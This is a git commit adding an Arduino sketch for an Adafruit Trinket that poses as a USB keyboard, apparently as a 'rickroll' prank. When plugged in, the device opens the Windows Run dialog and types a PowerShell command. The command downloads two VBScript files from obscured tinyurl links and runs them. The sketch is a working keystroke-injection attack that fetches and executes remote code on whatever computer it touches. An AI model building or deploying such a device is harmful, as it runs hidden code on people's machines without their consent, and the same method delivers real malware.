2a0f47e2d3af536a0d5dac81cef0813032b5daeb
Florian Vogt <95164540+ycidev@users.noreply.github.com>
2022-10-12 18:19:13 +0200

    Add files via upload

---
+++ adafruit-trinket-rickroll.ino
@@ -0,0 +1,30 @@
+#include <TrinketKeyboard.h>
+
+void setup() {
+  TrinketKeyboard.begin();
+  delay(2000);
+  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
+  delay(10);
+  TrinketKeyboard.pressKey(0, 0);
+  delay(200);
+  TrinketKeyboard.print("cmd");
+  TrinketKeyboard.pressKey(0, 0x28);
+  delay(5);
+  TrinketKeyboard.pressKey(0, 0);
+  delay(500);
+  TrinketKeyboard.print("powershell (new-object System.Net.WebClient)");
+  TrinketKeyboard.print(".DownloadFile('https://tinyurl.com/4w7h9ewc',");
+  TrinketKeyboard.print("'%userprofile%\\rickroll.vbs'); ");
+  TrinketKeyboard.print("&& start %userprofile%\\rickroll.vbs ");
+  TrinketKeyboard.print("&& powershell (new-object System.Net.WebClient)");
+  TrinketKeyboard.print(".DownloadFile('https://tinyurl.com/559b5rr3',");
+  TrinketKeyboard.print("'%userprofile%\\volup.vbs'); ");
+  TrinketKeyboard.print("&& start %userprofile%\\volup.vbs && exit");
+  TrinketKeyboard.pressKey(0, 0x28);
+  delay(5);
+  TrinketKeyboard.pressKey(0, 0);
+}
+
+void loop() {
+
+}
